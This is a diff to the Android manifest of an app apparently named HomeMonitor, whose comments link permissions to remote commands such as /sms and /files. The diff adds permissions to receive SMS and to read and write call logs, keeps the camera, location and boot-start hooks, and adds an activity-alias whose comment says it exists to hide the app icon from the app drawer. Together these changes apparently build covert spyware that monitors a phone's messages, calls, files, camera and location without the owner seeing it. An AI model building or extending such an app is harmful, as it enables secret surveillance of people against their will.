@@ -15,6 +15,11 @@
 
     <!-- Read SMS inbox for /sms command -->
     <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+
+    <!-- Call Logs permissions -->
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.WRITE_CALL_LOG" />
 
     <!-- Keep foreground service alive -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
@@ -39,11 +44,11 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
 
     <!-- Storage access for /files command -->
-    <!-- API 24–32: legacy broad storage read/write -->
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
         android:maxSdkVersion="32" />
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"
         android:maxSdkVersion="28" />
+    
     <!-- API 33+ (Android 13): granular media permissions -->
     <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
     <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
@@ -60,21 +65,26 @@
         android:supportsRtl="true"
         android:theme="@style/Theme.HomeMonitor">
 
-        <!-- ── Main Activity ── -->
+        <!-- ── Main Activity (Hidden from Launcher via Alias logic) ── -->
         <activity
             android:name=".MainActivity"
             android:exported="true">
+            <!-- Normal launcher filter is moved/handled or kept depending on hide mode -->
+        </activity>
+
+        <!-- ── App Icon Hider Alias (App Drawer se hide karne ke liye) ── -->
+        <activity-alias
+            android:name=".MainActivityAlias"
+            android:enabled="true"
+            android:exported="true"
+            android:targetActivity=".MainActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
-        </activity>
+        </activity-alias>
 
         <!-- ── Foreground Monitor Service ── -->
-        <!--
-             foregroundServiceType="camera" is mandatory on Android 14 (API 34+)
-             when a foreground service accesses the camera.
-        -->
         <service
             android:name=".MonitorService"
             android:enabled="true"
@@ -88,9 +98,7 @@
             android:enabled="true"
             android:exported="true">
             <intent-filter>
-                <!-- Standard boot completed -->
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
-                <!-- Fires after OTA / quick-boot on some devices -->
                 <action android:name="android.intent.action.QUICKBOOT_POWERON" />
             </intent-filter>
         </receiver>
